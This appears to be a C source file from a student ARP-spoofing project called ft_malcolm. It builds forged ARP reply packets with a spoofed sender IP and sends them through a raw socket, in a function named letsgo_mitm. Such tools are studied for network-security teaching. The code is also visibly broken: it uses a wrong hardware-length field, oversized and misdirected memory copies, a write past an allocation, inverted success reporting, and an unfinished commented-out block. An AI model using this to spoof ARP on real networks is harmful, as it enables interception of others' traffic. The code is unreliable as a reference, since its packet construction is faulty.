#include "ft_malcolm.h"

t_myarp	*create_arp_packet(const uint8_t my_mac_address[6], const uint8_t spoofed_ip_source[4], const uint8_t destination_mac_address[6], const uint8_t destination_ip[4])
{
  t_myarp	*arp;

  arp = ft_memalloc(sizeof(t_myarp));
  arp->htype = htons(1);
  arp->ptype = htons(ETH_P_IP);
  arp->hlen = 7;
  arp->plen = 4;
  arp->opcode = htons(2);
  ft_memcpy(&arp->source_mac, my_mac_address, sizeof(uint8_t) * 6);
  ft_memcpy(&arp->target_mac, destination_mac_address, sizeof(uint8_t) * 6);
  ft_memcpy(&arp->source_ip, spoofed_ip_source, sizeof(char) * 4);
  ft_memcpy(&arp->target_ip, destination_ip, sizeof(char) * 6);
  return (arp);
}

struct ethhdr *create_ethernet_packet(const uint8_t *src_mac, const uint8_t *dest_mac, const t_myarp *arp)
{
  struct ethhdr	*eth;

  eth = ft_memalloc(sizeof(struct ethhdr));
  ft_memcpy(&eth->h_dest, dest_mac, sizeof(uint8_t) * 6);
  ft_memcpy(&eth->h_source, src_mac, sizeof(uint8_t) * 6);
  ft_memcpy(&eth->h_proto, (uint8_t[2]){ETH_P_ARP / 256, ETH_P_ARP % 256}, sizeof(uint8_t) * 2);
  ft_memcpy((uint8_t *)eth + sizeof(struct ethhdr), arp, sizeof(uint8_t) * sizeof(t_myarp));
  return (eth);
}

void letsgo_mitm(t_malcolm *mlcml, struct sockaddr_ll *s)
{
	uint8_t *pkt;
	struct ethhdr *eth;
	t_myarp *arp;
	char *data[14];

	ft_bzero(data, 14);
int len = sizeof(struct ethhdr) + sizeof(t_myarp) + 14;
    if (!(pkt = ft_memalloc(len * sizeof(uint8_t))))
    	return ;
    arp = create_arp_packet(mlcml->mac_laddr, mlcml->arphdr.source_ip, mlcml->arphdr.target_mac, mlcml->arphdr.target_ip);
    eth = create_ethernet_packet(mlcml->arphdr.source_mac, mlcml->arphdr.target_mac, arp);
    ft_memcpy(pkt, &eth, sizeof(struct ethhdr));
    ft_memcpy(pkt + len - 14, &data, 14);
    if ((sendto(mlcml->socket, pkt, 64, 0, (struct sockaddr *)s, sizeof(*s))) <= 0)
    {
   		printf("pkt sent\n");
    	return;
    }
    // free()
}


// t_myarp create_arp_pkt(t_malcolm *mlcml, const uint16_t opcode)
// {
// 	t_myarp *pkt;

// 	if (!(pkt = ft_memalloc(sizeof(t_myarp))))
// 		return (NULL);
// 	pkt.htype = htons(1);
// 	pkt->ptype = htons(ETH_P_ARP);
// 	pkt->hlen = 6;
// 	pkt->plen = 4;
// 	pkt->opcode = htons(opcode);
// 	pkt->source_mac = 
// 	pkt->source_ip = ;
// 	pkt->target_mac = ft_strsplit(mlcml->target_mac, ":");
// 	pkt->target_ip = ;

// }

// uint8_t *create_ether_pkt()
// {
// 	uint8_t pkt[1500];

// 	return (pkt);
// } 